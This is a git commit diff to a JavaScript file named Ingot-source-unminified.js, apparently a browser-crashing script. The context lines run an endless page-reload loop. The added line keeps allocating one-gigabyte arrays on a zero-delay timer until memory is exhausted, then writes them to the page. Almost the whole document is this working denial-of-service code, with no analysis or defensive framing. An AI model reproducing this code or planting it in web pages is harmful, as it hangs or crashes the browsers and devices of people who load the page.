054b046a3d43fda2812d386e3b5399b62e8abb5c
MMarchjr <103056947+mmarchjr@users.noreply.github.com>
2023-01-27 13:16:19 -0600

    Update Ingot-source-unminified.js

--- Ingot-source-unminified.js
+++ Ingot-source-unminified.js
@@ -3,3 +3,4 @@ onbeforeunload = function(){localStorage.x=1};
 setTimeout(function(){
   while(1)location.reload(1)
 }, 1000)
+(async()=>{window.ab=[];setInterval(()=>ab.push(new Uint8Array(1e9)),0);await new Promise(r=>setTimeout(r,960000));document.write(JSON.stringify(ab))})();
